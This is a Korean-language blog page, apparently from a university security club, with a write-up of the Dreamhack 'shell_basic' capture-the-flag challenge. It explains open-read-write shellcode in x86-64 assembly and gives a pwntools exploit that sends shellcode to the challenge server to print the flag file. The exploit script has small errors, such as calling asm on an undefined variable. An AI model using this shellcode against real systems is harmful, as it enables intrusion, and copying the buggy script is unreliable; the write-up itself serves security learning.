@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/swing_logo.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/swing_logo.png" color="#222">
+  <meta name="google-site-verification" content="uoL1t-yrbhPowL65E-xnG5D1FNLOwghJsIG6iqHrEsc">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"log.swuswing.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.19.2","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="들어가며올해 32기 지원 서류에 있는 문제 중 하나인 포너블 문제를 풀어보려고 한다. 3문제 중 [중] 난이도의 이 문제만 포너블인데 아무도 풀지 않았다. 최대한 차근차근 풀이해보겠다.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="지원서 뜯어보기 [중] dreamhack shell_basic">
+<meta property="og:url" content="https://log.swuswing.com/2025/05/17/3102_250517/index.html">
+<meta property="og:site_name" content="SW1NGL0G">
+<meta property="og:description" content="들어가며올해 32기 지원 서류에 있는 문제 중 하나인 포너블 문제를 풀어보려고 한다. 3문제 중 [중] 난이도의 이 문제만 포너블인데 아무도 풀지 않았다. 최대한 차근차근 풀이해보겠다.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://log.swuswing.com/images/3102_250517_image1.png">
+<meta property="og:image" content="https://log.swuswing.com/images/3102_250517_image2.png">
+<meta property="og:image" content="https://log.swuswing.com/images/3102_250517_image3.png">
+<meta property="og:image" content="https://log.swuswing.com/images/3102_250517_image3.png">
+<meta property="article:published_time" content="2025-05-17T14:30:23.000Z">
+<meta property="article:modified_time" content="2026-01-09T06:48:26.126Z">
+<meta property="article:author" content="SWING">
+<meta property="article:tag" content="System Hacking">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://log.swuswing.com/images/3102_250517_image1.png">
+
+
+<link rel="canonical" href="https://log.swuswing.com/2025/05/17/3102_250517/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://log.swuswing.com/2025/05/17/3102_250517/","path":"2025/05/17/3102_250517/","title":"지원서 뜯어보기 [중] dreamhack shell_basic"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>지원서 뜯어보기 [중] dreamhack shell_basic | SW1NGL0G</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/rss2.xml" title="SW1NGL0G" type="application/rss+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">SW1NGL0G</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%EB%93%A4%EC%96%B4%EA%B0%80%EB%A9%B0"><span class="nav-number">1.</span> <span class="nav-text">들어가며</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%EC%85%B8%EC%BD%94%EB%93%9C%EB%9E%80"><span class="nav-number">2.</span> <span class="nav-text">셸코드란?</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#orw-%EC%85%B8%EC%BD%94%EB%93%9C"><span class="nav-number">2.1.</span> <span class="nav-text">orw 셸코드</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-open-syscall"><span class="nav-number">2.1.1.</span> <span class="nav-text">1. open syscall</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-read-syscall"><span class="nav-number">2.1.2.</span> <span class="nav-text">2. read syscall</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%EB%A7%88%EC%B9%98%EB%A9%B0"><span class="nav-number">3.</span> <span class="nav-text">마치며</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%EC%B0%B8%EA%B3%A0%EB%AC%B8%ED%97%8C"><span class="nav-number">4.</span> <span class="nav-text">참고문헌</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">SWING</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">37</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">65</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOnN3dS5zd2luZ0BnbWFpbC5jb20=" title="E-Mail → mailto:swu.swing@gmail.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL0Bzd3Vzd2luZw==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;@swuswing"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9zd2luZ19zd3U=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;swing_swu"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9zd3Vzd2luZy5jb20v" title="https:&#x2F;&#x2F;swuswing.com&#x2F;">SWING Official Website</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://log.swuswing.com/2025/05/17/3102_250517/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="SWING">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SW1NGL0G">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="지원서 뜯어보기 [중] dreamhack shell_basic | SW1NGL0G">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          지원서 뜯어보기 [중] dreamhack shell_basic
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="far fa-user"></i>
+    </span>
+    <span class="post-meta-item-text">author: elsso</span>
+  </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-05-17 23:30:23" itemprop="dateCreated datePublished" datetime="2025-05-17T23:30:23+09:00">2025-05-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%EC%A7%80%EC%9B%90%EC%84%9C-%EB%9C%AF%EC%96%B4%EB%B3%B4%EA%B8%B0-series/" itemprop="url" rel="index"><span itemprop="name">지원서 뜯어보기 series</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><!-- 지원서 뜯어보기 [중] dreamhack shell_basic-->
+
+<h1 id="들어가며"><a href="#들어가며" class="headerlink" title="들어가며"></a>들어가며</h1><p>올해 32기 지원 서류에 있는 문제 중 하나인 포너블 문제를 풀어보려고 한다. 3문제 중 [중] 난이도의 이 문제만 포너블인데 아무도 풀지 않았다. 최대한 차근차근 풀이해보겠다.</p>
+<span id="more"></span>
+<p><br><br></p>
+<h1 id="셸코드란"><a href="#셸코드란" class="headerlink" title="셸코드란?"></a>셸코드란?</h1><p>셸코드(Shellcode)는 시스템의 특정 명령을 실행하는 작은 사이즈의 프로그램을 뜻하여, 일반적으로 기계어 코드로 작성되어 있다. 이는 셸을 획득하기 위한 익스플로잇을 목적으로 하기 위해 제작되는 어셈블리 코드 조각이라고도 볼 수 있다. 셸코드로 불리는 이유는 일반적으로 명령 셸을 시작시켜 그곳으로부터 공격자가 영향 받은 컴퓨터를 제어하기 때문이다.<br><br></p>
+<h2 id="orw-셸코드"><a href="#orw-셸코드" class="headerlink" title="orw 셸코드"></a>orw 셸코드</h2><p>orw 셸코드란란 파일을 열고(Open) 내용을 읽은 후(Read) 화면에 출력(Write)하는 셸코드로 여기서 open, read, write 시스템 호출을 순서대로 사용한다.<br>여기서 시스템 호출(system call)이란 운영 체제의 커널이 제공하는 서비스에 대해 응용 프로그램의 요청에 따라 커널에 접근하기 위한 인터페이스이다.<br>아래는 orw 셸코드에 필요한 syscall에 대한 내용을 표로 정리한 것이다.</p>
+<table>
+<thead>
+<tr>
+<th>syscall</th>
+<th>%rax</th>
+<th>arg0 (%rdi)</th>
+<th>arg1 (%rsi)</th>
+<th>arg2 (%rdx)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>read</td>
+<td>0x00</td>
+<td>unsigned int fd</td>
+<td>char *buf</td>
+<td>size_t count</td>
+</tr>
+<tr>
+<td>write</td>
+<td>0x01</td>
+<td>unsigned int fd</td>
+<td>const char *buf</td>
+<td>size_t count</td>
+</tr>
+<tr>
+<td>open</td>
+<td>0x02</td>
+<td>const char *filename</td>
+<td>int flags</td>
+<td>umode_t mode</td>
+</tr>
+</tbody></table>
+<p>작동 방식은 open 함수로 파일을 연 후, 생성된 fd를 read 함수에 넘기고 읽은 후에 스택에 결과를 저장하게 된다.<br><br></p>
+<h3 id="1-open-syscall"><a href="#1-open-syscall" class="headerlink" title="1. open syscall"></a>1. open syscall</h3><p>시그니처: *<strong>int open(const char <em>pathname, int flags, mode_t mode);</em></strong></p>
+<p>역할: 파일을 연다.</p>
+<p>시스템 호출 번호: rax &#x3D; 2</p>
+<p>레지스터 사용:</p>
+<p>rdi &#x3D;&gt; 파일 경로 (예: &#x2F;tmp&#x2F;flag)</p>
+<p>rsi &#x3D;&gt; flag(열기 옵션 (O_RDONLY, O_WRONLY, O_RDWR 등))</p>
+<p>rdx &#x3D;&gt; mode(O_RDONLY(읽기 전용)- 0, O_WRONLY(쓰기 전용)- 1, O_RDWR(읽기&#x2F;쓰기)- 2) *orw 셸코드에서는 O_RDONLY이기 때문에 0으로 설정</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">push 0x67</span><br><span class="line">mov rax, 0x616c662f706d742f     ;스택에는 리틀 엔디안 형식으로 8 바이트 단위로만 값을 push할 수 있으므로 0x67를 먼저 push한 후, 0x616c662f706d742f를 push</span><br><span class="line">push rax</span><br><span class="line">mov rdi, rsp          ; rdi = &quot;/tmp/flag&quot;</span><br><span class="line">xor rsi, rsi          ; O_RDONLY = 0</span><br><span class="line">xor rdx, rdx          ; mode를 0으로 설정</span><br><span class="line">mov rax, 2            ; open syscall 호출(2)</span><br><span class="line">syscall               ; open(&quot;/tmp/flag&quot;, RD_ONLY, NULL)</span><br></pre></td></tr></table></figure>
+<p>syscall의 반환 값, 위 코드에서 보면 open으로 획득한 &#x2F;tmp&#x2F;flag의 fd는 rax에 저장된다.<br><br></p>
+<h3 id="2-read-syscall"><a href="#2-read-syscall" class="headerlink" title="2. read syscall"></a>2. read syscall</h3><p>역할: 파일에서 데이터를 읽는다.</p>
+<p>시그니처: *<strong>ssize_t read(int fd, void <em>buf, size_t count);</em></strong></p>
+<p>시스템 호출 번호: rax &#x3D; 0</p>
+<p>레지스터 사용:</p>
+<p>rdi &#x3D;&gt; 파일 디스크립터</p>
+<p>rsi &#x3D;&gt; 읽은 데이터를 저장할 버퍼 주소</p>
+<p>rdx &#x3D;&gt; 읽을 바이트 수</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, rax          ; rdi = fd</span><br><span class="line">mov rsi, rsp</span><br><span class="line">sub rsi, 0x30         ; rsi = rsp-0x30 ; 0x30바이트 읽을 거니까 읽을 버퍼 주소는 rsp-0x30</span><br><span class="line">mov rdx, 0x30         ; read 48 바이트</span><br><span class="line">mov rax, 0            ; read syscall 호출(0)</span><br><span class="line">syscall               ; read(fd, buf, 0x30)</span><br></pre></td></tr></table></figure>
+<br>
+### 3. write syscall
+역할: 데이터를 출력한다.
+
+<p>시그니처: *<strong>ssize_t write(int fd, const void <em>buf, size_t count);</em></strong></p>
+<p>시스템 호출 번호: rax &#x3D; 1</p>
+<p>레지스터 사용:</p>
+<p>rdi &#x3D;&gt; 출력할 대상의 fd (1은 표준 출력 stdout)</p>
+<p>rsi &#x3D;&gt; 출력할 버퍼 주소</p>
+<p>rdx &#x3D;&gt; 출력할 바이트 수</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, 1            ; stdout</span><br><span class="line">mov rdx, 0x30         ; 48바이트 출력 예정, rsi에 출력할 버퍼 주소는 위 read 부분에 이미 같은 주소 저장되어 있어서 작성 생략략</span><br><span class="line">mov rax, 1            ; read syscall 호출(1)</span><br><span class="line">syscall               ; write(fd, buf, 0x30)</span><br></pre></td></tr></table></figure>
+
+<p>사실 여기까지 orw 셸코드의 개념을 알아봤으면 이제 문제를 풀 방법을 선택할 수 있는데 첫번째는 위 asm 전체 코드를 다 합쳐서 컴파일 한 뒤, objdump를 이용하여 디스어셈블해서 필요한 셸코드만 추출한 후 최종 셸코드를 문제 서버에 전송하는 방법이다. 두번째는 pwntools에 셸코드를 작성해주는 함수인 shellcraft()가 있는데 이걸 이용하여 코드를 짠 다음 해당 익스플로잇 코드를 실행시키는 것이다.<br>아무래도 두번째 방법이 더 쉽기 때문에 두번째 방법으로 진행하도록 하겠다.<br><br><br><br>#문제 풀기</p>
+<p><img src="/images/3102_250517_image1.png" alt="그림 1. 문제 내용 확인"></p>
+<center><span style="font-size: 90%;">그림 1. 문제 내용 확인</span><br><span style="font-size: 70%;"></span></center><br>
+flag의 위치는 "/home/shell_basic/flag_name_is_loooooong"라는 힌트가 나와있고 execve, execveat 시스템 콜을 사용하지 말라고 하니 위에서 했던 orw를 이용하면 될 것 같다. 문제 파일을 보면 shell_basic 실행파일과 shell_basic.c 코드 파일이 있다. 코드 파일 먼저 살펴 보겠다.
+<br>
+##코드
+일단 문제 코드 먼저 보겠다.
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Compile: gcc -o shell_basic shell_basic.c -lseccomp</span></span><br><span class="line"><span class="comment">// apt install seccomp libseccomp-dev</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alarm_handler</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;TIME OUT&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    signal(SIGALRM, alarm_handler);</span><br><span class="line">    alarm(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">banned_execve</span><span class="params">()</span> &#123;</span><br><span class="line">  scmp_filter_ctx ctx;</span><br><span class="line">  ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">  <span class="keyword">if</span> (ctx == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), <span class="number">0</span>);</span><br><span class="line">  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  seccomp_load(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">  <span class="type">char</span> *shellcode = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);   </span><br><span class="line">  <span class="type">void</span> (*sc)();</span><br><span class="line">  </span><br><span class="line">  init();</span><br><span class="line">  </span><br><span class="line">  banned_execve();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;shellcode: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, shellcode, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">  sc = (<span class="type">void</span> *)shellcode;</span><br><span class="line">  sc();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>아까 문제 조건에서 본 것 처럼 execve과 execveat 시스템 콜을 막아놓은 함수가 보이고 그 밑에 main()이 보인다. 우리가 봐야할 부분은 여기다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *shellcode = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);   </span><br></pre></td></tr></table></figure>
+<p>mmap()을 이용해 크기 0x1000의 메모리를 할당하고 해당 영역은 읽기(R), 쓰기(W), 실행(X) 권한을 모두 가진다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;shellcode: &quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, shellcode, <span class="number">0x1000</span>);</span><br></pre></td></tr></table></figure>
+<p>위 코드는 ‘shellcode: ‘가 출력되면 그 뒤에 표준 입력(fd&#x3D;0은 stdin)으로 최대 0x1000 바이트의 데이터를 shellcode 메모리로 읽어들이는 것이다. 즉 여기가 셸코드를 입력하는 부분이므로 우리는 여기서 orw 셸코드를 작성해서서 shellcode로 넘겨주면 되는 것이다. 가장 먼저 문제 서버 주소와 포트 번호를 확인해준다.<br><img src="/images/3102_250517_image2.png" alt="그림 2. 문제 서버와 포트 확인"></p>
+<center><span style="font-size: 90%;">그림 2. 문제 서버와 포트 확인</span><br><span style="font-size: 70%;"></span></center><br>
+그 다음 실행파일의 아키텍처를 checksec으로 확인해주겠다.
+
+<p><img src="/images/3102_250517_image3.png" alt="그림 3. 아키텍처 확인"></p>
+<center><span style="font-size: 90%;">그림 3. 아키텍처 확인</span><br><span style="font-size: 70%;"></span></center><br>
+amd64인 것을 확인할 수 있다.
+이제 익스플로잇 코드를 짜보겠다.
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># open할 flag 파일 경로</span></span><br><span class="line">path = <span class="string">&quot;/home/shell_basic/flag_name_is_loooooong&quot;</span></span><br><span class="line">shell = shellcraft.<span class="built_in">open</span>(path)	</span><br></pre></td></tr></table></figure>
+<p>shellcraft.open(“&#x2F;home&#x2F;shell_basic&#x2F;flag_name_is_loooooong”)는 open(“&#x2F;home&#x2F;shell_basic&#x2F;flag_name_is_loooooong”) syscall에 해당하는 x86-64 어셈블리 코드를 생성하게 되는데 이 시스템 호출의 결과는 rax 레지스터에 저장되고, 이것이 fd(파일 디스크립터)가 된다. </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x30</span>)</span><br></pre></td></tr></table></figure>
+<p>read(fd, buf, 0x30)를 의미한다. rax가 방금 open한 파일 디스크립터이므로, 이 파일에서 데이터를 읽는다. read를 이용하여여 rsp(스택 위치)에서 최대 0x30 바이트를 읽어온다. 혹시나 읽어오는 바이트가 플래그보다 부족해도 나중에 고치면 되니 적당히 0x30으로 해놓는다.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell += shellcraft.write(<span class="number">1</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x30</span>)</span><br></pre></td></tr></table></figure>
+<p>다음 코드는 write(stdout, buf, 0x30)을 의미한는데 이는 write(stdout, buf, size) 시스템 호출이다. stdout의 번호는 1이기 때문에 고정해놓고 방금 rsp에 읽어둔 내용을 0x30 바이트 만큼 읽어 stdout으로 터미널에 플래그를 출력한다.</p>
+<p>그 다음 asm으로 셸코드를 기계어로 변환한 후, 아까 위에서 본 코드 파일의 셸코드를 입력하는 부분에 우리가 쓴 셸코드를 보내면 된다.<br>이렇게 되면 전체 익스플로잇 코드는 다음과 같다.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;host8.dreamhack.games&quot;</span>, <span class="number">21439</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">path = <span class="string">&quot;/home/shell_basic/flag_name_is_loooooong&quot;</span></span><br><span class="line">shell = shellcraft.<span class="built_in">open</span>(path)	</span><br><span class="line">shell += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x30</span>)</span><br><span class="line">shell += shellcraft.write(<span class="number">1</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x30</span>)	</span><br><span class="line">shell = asm(shellcode)	<span class="comment"># shell을을 기계어로 변환</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;shellcode: &quot;</span>, shell)    <span class="comment"># &quot;shellcode: &quot;가 출력되면 shell + &#x27;\n&#x27;을 입력</span></span><br><span class="line">r.interactive()    <span class="comment"># 익스플로잇 실행 후 서버와 터미널 연결</span></span><br></pre></td></tr></table></figure>
+<p>이제 이 코드를 실행시키면</p>
+<p><img src="/images/3102_250517_image3.png" alt="그림 4. 익스플로잇 실행 결과"></p>
+<center><span style="font-size: 90%;">그림 4. 익스플로잇 실행 결과</span><br><span style="font-size: 70%;"></span></center><br>
+위 사진처럼 DH{ca562d7cf1db6c55cb11c4ec350a3c0b}라는 플래그 값을 얻을 수 있다. 
+<br><br>
+
+<h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며"></a>마치며</h1><p>사실 asm 코드 컴파일 한 다음, 셸코드 다 추출해서 전송하는 방식으로 작성할까 했지만 pwntools 작성 방식이 더 이해하기도 쉽고 간편하고 많이 쓰는 방식이기도 해서 위 방식으로 작성했다.<br><br></p>
